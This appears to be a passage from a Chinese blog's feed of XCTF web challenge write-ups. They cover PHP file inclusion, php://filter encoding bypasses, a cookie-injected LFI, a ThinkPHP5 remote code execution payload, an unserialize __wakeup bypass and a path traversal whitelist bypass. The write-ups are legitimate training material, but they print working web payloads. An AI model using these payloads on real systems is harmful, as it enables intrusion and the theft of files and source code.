<h3 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h3><p><strong>二次编码URL绕过</strong><br>我们只需将as和nc连续编码两次。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符		第1次		第2次</span><br><span class="line">as 		%61%73		%2561%2573</span><br><span class="line">nc 		%63%6f		%2563%256f</span><br></pre></td></tr></table></figure>
<p>用第二次编码后的字符替换掉原来的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter/convert.b%2561%2573e64-en%2563%256fde/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h3><p><strong>convert.iconv.* 绕过</strong><br>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。<br>iconv — 字符串按要求的字符编码来转换<br>convert.iconv.*的使用有两种方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
<p>列举部分编码方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*	UCS-4BE	 UCS-4LE*  UCS-2  UCS-2BE  </span><br><span class="line">UCS-2LE  UTF-32*  UTF-32BE*  UTF-32LE*  </span><br><span class="line">UTF-16*  UTF-16BE*  UTF-16LE*  UTF-7  </span><br><span class="line">UTF7-IMAP  UTF-8*  ASCII*  EUC-JP*  SJIS*</span><br><span class="line">eucJP-win*  SJIS-win*  ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS  CP932  CP51932  BASE64</span><br></pre></td></tr></table></figure>
<p>更多可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a><br>经过多次尝试，最终找到了其中一种编码绕过方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure>


<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没有直接看答案做出的题还是让人蛮高兴的。又学习到了一点。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568">base64 的编码小trick</a><br><a href="https://blog.csdn.net/yuanxu8877/article/details/127607264">攻防世界web-file_include</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-fileclude</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含的第一道ctf，之前也没练过，所以不知道怎么做。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>分析代码<br>打开后显示这样一段php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>看到php代码中的flag.php，我们直接在url后面加上，但是没有成功。<br>于是开始分析代码，可以看到要求以get方式传2个参数file1和file2。<br>file1的要求是非空，且被放入了include函数中。<br>file2放入了file_get_contents函数中，要求是全等于hello ctf<br>那么可以使用伪协议来读取flag.php源代码。</p>
</li>
<li><p>伪协议与解码<br>可使用的伪协议有很多种，这里仅演示我使用的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf</span><br></pre></td></tr></table></figure>
<p>得到一串base64编码的数据，只需解码即可得到flag</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第一次做文件包含的题，仅仅是开始！</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_59057526/article/details/126747831">攻防世界-fileclude</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-fileinclde</title>
    <url>/2022/11/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>换了种方式，就不会了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!?php</span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">	@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">	@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_get				获取一个配置选项的值</span><br><span class="line"></span><br><span class="line">ini_set 			为一个配置选项设置值</span><br><span class="line"></span><br><span class="line">display_errors 		错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项。错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利。推荐关闭此选项。 </span><br><span class="line">display_errors = On</span><br><span class="line">开启状态下，若出现错误，则报错，出现错误提示</span><br><span class="line">dispaly_errors = Off </span><br><span class="line">关闭状态下，若出现错误，则提示：服务器错误。但是不会出现错误提示</span><br><span class="line"></span><br><span class="line">error_reporting 	设置应该报告何种 PHP 错误</span><br><span class="line">error_reporting(0);  // 关闭所有PHP错误报告</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // 报告 E_NOTICE也挺好 (报告未初始化的变量或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);  // 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL);  // 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);  // 报告所有 PHP 错误</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);  // 和 error_reporting(E_ALL); 一样</span><br><span class="line"></span><br><span class="line">$_COOKiE 			通过 HTTP Cookies 方式传递给当前脚本的变量的数组</span><br><span class="line"></span><br><span class="line">setcookie() 		setcookie() 定义了 Cookie，会和剩下的消息头一起发送给客户端。和其他消息头一样，必须在脚本产生任意输出之前发送 Cookie（由于协议的限制）。</span><br><span class="line"></span><br><span class="line">include 			include 表达式包含并运行指定文件</span><br><span class="line"></span><br><span class="line">file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>构造语句抓包<br>我们分析完源码后可知参数是从cookie传入的，于是可以使用抓包的方法修改cookie<br>接下来我们便是构造语句来获取flag，因为源码中文件名后面会接php，所以不需要在语句末尾中加.php<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:language=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>传参的方式不止一种，灵活处理。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-php_rce</title>
    <url>/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道关于ThinkPHP5框架的命令执行漏洞。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>查资料<br>打开页面后，发现是一个ThinkPHP5框架。<br>在GitHub上搜索，“ThinkPHP5 漏洞” 找到可以利用的类似payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
<p>成功打开phpinfo界面，说明payload有效。</p>
</li>
<li><p>构造payload<br>由于我们是需要找到flag，那么就构造能够显示payload的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /f*</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-unserialize3</title>
    <url>/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>是我做的第一道反序列化的ctf呢。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>__wakeup()魔术方法<br>简单来说，<br>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。<br>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br><a href="https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-wakeup.html">详细解释</a></li>
</ul>
<p>根据源码可以看出，明显为反序列化漏洞，我们需要绕过__wakeup()方法，否则会直接退出，而正好该__wakeup方法有一个绕过方式，即：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。<br>那么首先需要实例化对象。</p>
<ol start="2">
<li>构造payload<br>实例化对象，根据源码编辑php脚本输出序列化字符串：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
结果得到：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
增加对象属性个数，<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
将得到的字符串键值对输入url地址栏，即可得到flag：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
成功拿到flag</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-warmup</title>
    <url>/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p>
</li>
<li><p>分析代码</p>
</li>
</ol>
<ul>
<li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p>
</li>
<li><p>白名单数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure>
</li>
<li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p>
</li>
<li><p>mb_substr()函数<br>该函数是获取部分字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
</li>
<li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p>
</li>
<li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p>
</li>
<li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p>
</li>
<li><p>emmm::checkFile()<br>输出emmm函数的返回值</p>
</li>
</ul>
<p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p>
<ol start="3">
<li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
拿到flag</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_web2</title>
    <url>/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一次密码破译，还是比较有趣的。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>strrev()函数<br>反转字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strrev(string $string): string</span><br><span class="line">返回 string 反转后的字符串。</span><br></pre></td></tr></table></figure>
</li>
<li><p>ord()函数<br>转换字符串第一个字节为 0-255 之间的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ord(string $character): int</span><br><span class="line">解析 character 二进制值第一个字节为 0 到 255 范围的无符号整型类型。</span><br><span class="line"></span><br><span class="line">如果字符串是 ASCII、 ISO-8859、Windows 1252之类单字节编码，就等于返回该字符在字符集编码表中的位置。 但请注意，本函数不会去检测字符串的编码，尤其是不会识别类似 UTF-8 或 UTF-16 这种多字节字符的 Unicode 代码点（code point）。</span><br><span class="line"></span><br><span class="line">该函数是 chr() 的互补函数。</span><br></pre></td></tr></table></figure>
</li>
<li><p>chr()函数<br>从数字生成单字节字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr(int $codepoint): string</span><br><span class="line">返回单字符字符串，包含将 codepoint 作为无符号整数解释的指定字符。</span><br><span class="line"></span><br><span class="line">这可用于在一种单字节编码（像是 ASCII、ISO-8859 或 Windows 1252）中通过传递想要的字符在编码映射表中的位置来创建单字符字符串。</span><br><span class="line">但是，注意此函数并不清楚任何字符串编码，特别是无法通过传递一个 Unicode 码位值来生成多字节编码（像是 UTF-8 或 UTF-16）字符串。</span><br><span class="line"></span><br><span class="line">此函数与 ord() 互补。</span><br></pre></td></tr></table></figure>
</li>
<li><p>str_rot13()函数<br>对字符串执行 ROT13 转换</p>
